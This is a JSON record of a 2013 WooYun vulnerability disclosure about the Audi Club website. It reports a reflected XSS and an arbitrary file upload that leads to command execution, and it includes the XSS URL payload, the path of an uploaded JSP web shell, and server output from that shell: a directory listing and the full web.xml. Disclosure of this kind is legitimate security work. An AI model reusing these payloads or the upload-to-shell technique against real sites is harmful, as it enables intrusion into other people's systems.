{"id": 64535, "wybug_id": "wooyun-2013-025533", "wybug_title": "奥迪俱乐部代码执行", "wybug_corp": "一汽-大众汽车有限公司", "wybug_author": "zhk", "wybug_date": "2013-06-09 12:48", "wybug_open_date": "2013-07-24 12:48", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-24：\t细节向公众公开  简要描述： 奥迪俱乐部代码执行，顺便附上个XSS 详细说明：  反射型XSS：http://www.audiclub.cn/uploadHeadImg/uploadimage.jsp?Picurl=pic2000844.jpg%22%3EXSS%20here&step=2代码执行：http://www.audiclub.cn/circle!create.action 存在任意文件上传，导致命令执行\n当前/www/newaudi_cms/audiclub/目录有: /www/newaudi_cms/audiclub/weibo/www/newaudi_cms/audiclub/circle/www/newaudi_cms/audiclub/upload/www/newaudi_cms/audiclub/admin/www/newaudi_cms/audiclub/album/www/newaudi_cms/audiclub/activity/www/newaudi_cms/audiclub/integral/www/newaudi_cms/audiclub/landofquattro/www/newaudi_cms/audiclub/q3/www/newaudi_cms/audiclub/vedio/www/newaudi_cms/audiclub/My97DatePicker/www/newaudi_cms/audiclub/image/www/newaudi_cms/audiclub/js/www/newaudi_cms/audiclub/common/www/newaudi_cms/audiclub/2013shms/www/newaudi_cms/audiclub/user/www/newaudi_cms/audiclub/uploadfiles/www/newaudi_cms/audiclub/xheditor-1.1.14/www/newaudi_cms/audiclub/m/www/newaudi_cms/audiclub/WEB-INF/www/newaudi_cms/audiclub/uploadHeadImg/www/newaudi_cms/audiclub/excellence文件有: /www/newaudi_cms/audiclub/index.jsp/www/newaudi_cms/audiclub/wb_e4b0b2761bda439d.txt/www/newaudi_cms/audiclub/__utm.gif/www/newaudi_cms/audiclub/index.html/www/newaudi_cms/audiclub/500.html/www/newaudi_cms/audiclub/404.html/www/newaudi_cms/audiclub/crossdomain.xml/www/newaudi_cms/audiclub/login.jsp/www/newaudi_cms/audiclub/urchin.js\n   漏洞证明：  view-source:http://www.audiclub.cn/image/1370751804647.jsp?p=/WEB-INF/web.xml\nFILE:/WEB-INF/web.xml <?xml version=\"1.0\" encoding=\"UTF-8\"?><web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \t\txmlns=\"http://java.sun.com/xml/ns/javaee\" \t\txmlns:web=\"http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\" \t\txsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\" \t\tid=\"WebApp_ID\" version=\"2.5\">\t<display-name>OEMP CMS</display-name>\t<context-param>\t\t<param-name>contextConfigLocation</param-name>\t\t<param-value>/WEB-INF/classes/applicationContext.xml</param-value>\t</context-param>\t<filter>\t\t<filter-name>struts-cleanup</filter-name>\t\t<filter-class>org.apache.struts2.dispatcher.ActionContextCleanUp</filter-class>\t</filter>\t    <filter>\t\t<filter-name>osivFilter</filter-name>\t\t<filter-class>org.springframework.orm.hibernate3.support.OpenSessionInViewFilter</filter-class>\t</filter>     <filter>        <filter-name>struts2</filter-name>        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>    </filter>      \t<filter-mapping>        <filter-name>struts-cleanup</filter-name>        <url-pattern>/*</url-pattern>    </filter-mapping>           <filter-mapping>\t\t<filter-name>osivFilter</filter-name>\t\t<url-pattern>*.action</url-pattern>\t</filter-mapping>\t\t<filter-mapping>        <filter-name>struts2</filter-name>        <url-pattern>*.jsp</url-pattern>    </filter-mapping>    \t<filter-mapping>\t\t<filter-name>osivFilter</filter-name>\t\t<url-pattern>*.htm</url-pattern>\t</filter-mapping> \t\t<filter-mapping>        <filter-name>struts2</filter-name>        <url-pattern>*.action</url-pattern>    </filter-mapping>    <filter-mapping>        <filter-name>struts2</filter-name>        <url-pattern>*.jsp</url-pattern>    </filter-mapping>    <filter-mapping>        <filter-name>struts2</filter-name>        <url-pattern>*.htm</url-pattern>    </filter-mapping>        \t<listener>\t\t<listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\t</listener>\t<!-- Spring 刷新Introspector防止内存泄露 -->\t<listener>\t\t<listener-class>org.springframework.web.util.IntrospectorCleanupListener</listener-class>\t</listener>\t<!-- 需要注释掉listenser -->\t\t<!-- session超时定义,单位为分钟 -->\t<session-config>\t\t<session-timeout>120</session-timeout>\t</session-config>\t\t<error-page>        <error-code>500</error-code>        <location>/500.html</location>    </error-page>    <error-page>        <error-code>404</error-code>        <location>/404.html</location>    </error-page>\t<welcome-file-list>\t\t<welcome-file>index.htm</welcome-file>        <welcome-file>index.html/welcome-file>        <welcome-file>index.jsp</welcome-file>    </welcome-file-list>        <mime-mapping> \t\t<extension>rar</extension>\t\t<mime-type>application/zip</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>doc</extension>\t\t<mime-type>application/zip</mime-type>\t</mime-mapping>\t\t <!-- 上传头像servlet 开始-->  <servlet>    <servlet-name>UpLoadUserHeadImage</servlet-name>    <servlet-class>com.oemp.audi.uploadHeadImg.servlet.UpLoadUserHeadImage</servlet-class>  </servlet>  <servlet-mapping>    <servlet-name>UpLoadUserHeadImage</servlet-name>    <url-pattern>/servlet/UpLoadUserHeadImage</url-pattern>  </servlet-mapping>    <servlet>    <servlet-name>ZoomImage</servlet-name>    <servlet-class>com.oemp.audi.uploadHeadImg.servlet.ZoomImage</servlet-class>  </servlet>    <servlet-mapping>    <servlet-name>ZoomImage</servlet-name>    <url-pattern>/servlet/ZoomImage</url-pattern>  </servlet-mapping>  <!-- 上传头像servlet 结束--></web-app>\n\n\n   修复方案：  对文件进行过滤   版权声明：转载请注明来源 zhk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-06-14 01:25 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}